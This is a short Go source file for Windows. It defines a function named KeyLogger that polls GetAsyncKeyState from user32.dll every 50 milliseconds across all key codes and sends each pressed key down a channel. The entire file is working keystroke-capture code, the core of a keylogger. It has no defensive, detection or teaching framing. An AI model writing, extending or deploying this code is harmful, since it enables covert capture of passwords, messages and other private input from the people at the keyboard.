package KeyBoard

import (
	"syscall"
	"time"
)

var (
	procGetAsyncKeyState = syscall.NewLazyDLL("user32.dll").NewProc("GetAsyncKeyState")
)

type KeyBoard struct {
	Char     string
	DateTime time.Time
}

func KeyLogger(ch chan string) {
	for {
		time.Sleep(50 * time.Millisecond)
		for i := 0; i < 0xFF; i++ {
			async, _, _ := procGetAsyncKeyState.Call(uintptr(i))
			if async&0x1 == 0 {
				continue
			}
			ch <- string(i)
		}
	}

}
